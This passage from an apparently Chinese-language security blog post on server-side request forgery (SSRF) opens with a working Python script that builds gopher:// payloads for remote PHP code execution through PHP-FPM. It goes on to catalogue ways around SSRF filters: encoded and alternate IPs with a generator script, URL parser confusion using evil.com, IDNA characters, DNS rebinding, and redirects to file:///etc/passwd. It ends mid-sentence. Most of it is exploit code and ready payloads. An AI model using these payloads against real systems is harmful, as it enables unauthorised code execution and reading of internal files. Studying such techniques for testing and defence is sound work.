class="title function_">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span><br><span class="line">        length = <span class="built_in">len</span>(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span><br><span class="line">        nLen = <span class="built_in">len</span>(name)</span><br><span class="line">        vLen = <span class="built_in">len</span>(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span><br><span class="line">        header = <span class="built_in">dict</span>()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span><br><span class="line">        header = buffer.read(<span class="built_in">int</span>(self.__FCGI_HEADER_SIZE))</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = <span class="built_in">int</span>(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(<span class="built_in">int</span>(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">       <span class="comment"># if not self.__connect():</span></span><br><span class="line">        <span class="comment">#    print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;)</span></span><br><span class="line">         <span class="comment">#   return</span></span><br><span class="line"> </span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = <span class="built_in">dict</span>()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line">        <span class="comment">#print base64.b64encode(request)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">        <span class="comment"># self.sock.send(request)</span></span><br><span class="line">        <span class="comment"># self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment"># self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27;</span></span><br><span class="line">        <span class="comment"># return self.__waitForResponse(requestId)</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__waitForResponse</span>(<span class="params">self, requestId</span>):</span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"> </span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == <span class="built_in">int</span>(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.host, self.port)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">9000</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line"> </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"> </span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = <span class="built_in">dict</span>()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % <span class="built_in">len</span>(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    response = urllib.quote(response)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;gopher://127.0.0.1:&quot;</span> + <span class="built_in">str</span>(args.port) + <span class="string">&quot;/_&quot;</span> + response)</span><br></pre></td></tr></table></figure><h2 id="其他 Payload"><a href="# 其他 Payload" class="headerlink" title="其他 Payload"></a>其他 Payload</h2><ul><li>在 PHP 的 SSRF 中，同样支持 PHP 伪协议。</li></ul><h1 id="绕过"><a href="# 绕过" class="headerlink" title="绕过"></a>绕过 </h1><h2 id="本机 IP"><a href="# 本机 IP" class="headerlink" title="本机 IP"></a> 本机 IP</h2><p>可以用 <code>0.0.0.0</code>，<code>localhost</code> 或者 <code>127.x.x.x</code> 替代<code>127.0.0.1</code>。</p><p>IP 地址中间的 <code>0</code> 可以被省略，例如 <code>127.1</code> 等价于 <code>127.0.0.1</code>。而<code>http://0.0.0.0/</code> 可以被省略为<code>http://0/</code>。</p><h2 id="等价 IP"><a href="# 等价 IP" class="headerlink" title="等价 IP"></a>等价 IP</h2><p>特殊域名 <code>xip.io</code> 提供了 IP 解析，例如可以用 <code>192.168.0.1.xip.io</code> 或者 <code>a.b.c.192.168.0.1.xip.io</code> 等价于<code>192.168.0.1</code>。此外，可以利用在线短地址服务，利用短地址指向被限制的 IP。</p><p>IP 地址其实就是一串数字，可以进行进制转换。例如：<code>127.0.0.1</code>，等价于十六进制<code>0x7F000001</code>，等价于十进制<code>2130706433</code>，等价于二进制<code>0b1111111000000000000000000000001</code>。</p><p>也可以只转换部分 IP，例如：<code>127.0.0.1</code>，等价于<code>0177.0.0.1</code>，等价于<code>0x7f.0.0.1</code>。也可以混合编码，例如八进制和十六进制混合<code>0177.0x0.0x0.0x1</code>。</p><blockquote><p>注意：进制转换后的 IP，Apache 服务器会报 400，而 Nginx，Mysql 等服务可以正常识别。</p></blockquote><p>IP 地址转换脚本，可以打印出所有的等价 IP 地址，包括十进制，八进制，十六进制，二进制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">marge</span>(<span class="params">l</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        result += <span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    result = <span class="built_in">int</span>(result, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> [result, <span class="built_in">hex</span>(result), <span class="built_in">oct</span>(result), <span class="built_in">bin</span>(result)]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cross</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> ip <span class="keyword">in</span> args[<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> iplist:</span><br><span class="line">                iplist.append(ip)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(args) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> args[<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> args[<span class="number">1</span>]:</span><br><span class="line">                ip = <span class="string">&#x27;%s.%s&#x27;</span> % (i, j)</span><br><span class="line">                <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> iplist:</span><br><span class="line">                    iplist.append(ip)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(args) == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> args[<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> args[<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> args[<span class="number">2</span>]:</span><br><span class="line">                    ip = <span class="string">&#x27;%s.%s.%s&#x27;</span> % (i, j, k)</span><br><span class="line">                    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> iplist:</span><br><span class="line">                        iplist.append(ip)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(args) == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> args[<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> args[<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> args[<span class="number">2</span>]:</span><br><span class="line">                    <span class="keyword">for</span> l <span class="keyword">in</span> args[<span class="number">3</span>]:</span><br><span class="line">                        ip = <span class="string">&#x27;%s.%s.%s.%s&#x27;</span> % (i, j, k, l)</span><br><span class="line">                        <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> iplist:</span><br><span class="line">                            iplist.append(ip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iplist = [ip]</span><br><span class="line">raw_ip = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ip.split(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line">cross(marge(raw_ip))</span><br><span class="line">cross(marge(raw_ip[:<span class="number">1</span>]), marge(raw_ip[<span class="number">1</span>:]))</span><br><span class="line">cross(marge(raw_ip[:<span class="number">3</span>]), marge(raw_ip[<span class="number">3</span>:]))</span><br><span class="line">cross(marge(raw_ip[:<span class="number">2</span>]), marge(raw_ip[<span class="number">2</span>:<span class="number">3</span>]), marge(raw_ip[<span class="number">3</span>:]))</span><br><span class="line">cross(marge(raw_ip[:<span class="number">1</span>]), marge(raw_ip[<span class="number">1</span>:<span class="number">3</span>]), marge(raw_ip[<span class="number">3</span>:]))</span><br><span class="line">cross(marge(raw_ip[:<span class="number">1</span>]), marge(raw_ip[<span class="number">1</span>:<span class="number">2</span>]), marge(raw_ip[<span class="number">2</span>:]))</span><br><span class="line">cross(marge(raw_ip[:<span class="number">1</span>]), marge(raw_ip[<span class="number">1</span>:<span class="number">2</span>]),</span><br><span class="line">      marge(raw_ip[<span class="number">2</span>:<span class="number">3</span>]), marge(raw_ip[<span class="number">3</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> iplist:</span><br><span class="line">    <span class="built_in">print</span>(ip)</span><br></pre></td></tr></table></figure><h2 id="前缀限制"><a href="# 前缀限制" class="headerlink" title="前缀限制"></a>前缀限制 </h2><p> 必须以指定域名开头<code>^http://www.baidu.com.*</code></p><p>利用 url 中可选的用户名和密码部分，域名或 ip 地址前的 <code>@</code> 表示访问到该 url 需要输入的用户名和密码，其中 <code>:</code> 前为用户名，后为密码，例如 <code>http://username:password@example.com/</code>。则<code>http://www.baidu.com@127.0.0.1</code> 或者 <code>http://www.baidu.com:xxxx@127.0.0.1</code> 等价于<code>http://127.0.0.1</code>。</p><p>可以利用 <code>xip.io</code> 绕过前缀限制，例如<code>http://www.baidu.com.127.0.0.1.xip.io/</code></p><h2 id="后缀限制"><a href="# 后缀限制" class="headerlink" title="后缀限制"></a>后缀限制 </h2><p> 必须以指定域名结尾<code>.*baidu.com$</code></p><p>可以尝试利用如下 payload 绕过。</p><ul><li><code>http://127.0.0.1/index.php#www.baidu.com</code></li><li><code>http://127.0.0.1/index.php?baidu.com</code></li></ul><h2 id="畸形 url"><a href="# 畸形 url" class="headerlink" title="畸形 url"></a>畸形 url</h2><p>例如 url<code>http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3/</code>（注意其中包含了 2 个空格），在 Python 中，urllib2 和 httplib 会解析出<code>1.1.1.1</code>，requests 会解析出<code>2.2.2.2</code>，urllib 会解析处<code>3.3.3.3</code>。</p><p>例如 url<code>http://127.0.0.1:12345:80/</code>，PHP 的 <code>parse_url</code> 和 Perl 的 <code>URI</code> 会解析出 80 端口，而 PHP 的 <code>readfile</code> 和 Perl 的 <code>LWP</code> 会解析出 12345 端口。</p><p>例如 url<code>http://127.0.0.1#@evil.com/</code>，PHP 的 <code>readfile</code> 会解析出 <code>evil.com</code>，PHP 的<code>parse_url</code> 会解析出<code>127.0.0.1</code>。</p><p>例如 url<code>http://foo@127.0.0.1:80@evil.com/</code>，curl/libcurl 会解析出 <code>127.0.0.1:80</code>，NodeJS 的<code>URL</code>，Perl 的<code>URI</code>，Go 的<code>net/url</code>，PHP 的<code>parse_url</code>，Ruby 的<code>addressable</code> 会解析出<code>evil.com</code>。</p><blockquote><p>注意：上条 payload 中 curl 7.54.0 之前已经修复，但是可以通过 <code>http://foo@127.0.0.1 @evil.com/</code> 绕过。注意 <code>@</code> 之前有一个空格。</p></blockquote><p>curl 或者 wget 可尝试下列 payload，都会解析出<code>http://127.0.0.1/</code>。</p><ul><li><code>http://127.0.0.1;baidu.com/</code></li><li><code>0://127.0.0.1;baidu.com/</code></li><li><code>0://127.0.0.1:80;baidu.com:80/</code></li><li><code>0://127.0.0.1:80=baidu.com:80</code></li><li><code>0://abc@127.0.0.1:80@baidu.com</code></li></ul><blockquote><p>注意：也可以使用逗号 <code>,</code> 代替分号<code>;</code>。</p></blockquote><p>利用空 bash 变量 <code>$</code> 绕过，需要将 url 带入 bash 中，例如 <code>http://127.0.0$foo.1</code> 中，<code>$foo</code>变量不存在，默认为空字符串，等价于<code>http://127.0.0.1</code>。</p><h2 id="特殊符号"><a href="# 特殊符号" class="headerlink" title="特殊符号"></a>特殊符号 </h2><p> 过滤了 <code>.</code> 符号，某些情况可以用中文句号 <code>。</code> 代替（例如 Chrome）。</p><p>在某些情况下（例如 curl）支持国际化特殊符号（IDNA），它们与对应的数字 / 字母等价。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ </span><br><span class="line">⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽</span><br><span class="line">⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇</span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑</span><br><span class="line">⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛</span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨</span><br><span class="line">⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ</span><br><span class="line">Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ</span><br><span class="line">ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾</span><br><span class="line">⓿ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br></pre></td></tr></table></figure><p>例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 等价于<code>example.com</code>。</p><p>除了上述 IDNA 字符以外，利用一些 unicode 字符解析不兼容性也可以绕过，例如 <code>ß</code> 在某些情况下等价于 <code>ss</code>，此外，一些 unciode 字符也会被忽略，例如<code>g\u200Doogle.com</code> 等价于 <code>google.com</code>，其中<code>\u200D</code> 被忽略。</p><h2 id="DNS 重绑定"><a href="#DNS 重绑定" class="headerlink" title="DNS 重绑定"></a>DNS 重绑定 </h2><p> 服务器向 DNS 服务器请求解析两次域名，在 DNS 服务器可控的情况下利用两次解析之间的时间差绕过 IP 地址限制。</p><ol><li>客户端（攻击者）向服务器发送正常域名<code>http://example.com</code>。</li><li>服务器拿到域名后做 DNS 解析，例如验证该域名是否为内网 IP，DNS 服务器第一次返回了一个非内网 IP 地址 A。</li><li>该域名在服务器端通过验证，域名被继续传递给可以 SSRF 的函数，例如<code>url_open</code>，这时又会发生第二次 DNS 解析。</li><li>在第二次 DNS 解析发生之前，在 DNS 服务器中修改该域名的 IP 为内网 IP，并且设置 TTL 为 0。</li><li>服务端再次向 DNS 服务器发送解析请求，而这时 DNS 服务器中该域名的 IP 已经被修改为内网 IP，并且该域名的 TTL 被修改为 0，即 DNS 服务器会直接新修改的 IP 而不是之前的缓存。</li><li>服务器收到内网 IP 地址 B，成功绕过。</li></ol><h2 id="重定向"><a href="# 重定向" class="headerlink" title="重定向"></a>重定向 </h2><p> 若可以访问外网但无法直接访问内网，在支持跳转的情况下，可以利用外网作为 302 跳板绕过协议限制。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location: http://127.0.0.1&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location: file:///etc/passwd&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h2><p>在服务器支持 IPv6 的情况下可用。</p><p><code>::1</code>等价于 IPv4 的 <code>127.0.0.1</code>。<code>ip6-localhost</code> 等价于 IPv4 的<code>localhost</code>。</p><p>IPv6 也提供了特殊域名解析 <code>ip6.name</code>，例如<code>x.1.ip6.name</code> 等价于 IPv4<code>127.0.0.1.xip.io</code>。</p><p>IPv6 也可以省略 IP 地址中间的 0，例如 <code>http://[::]/</code> 等价于 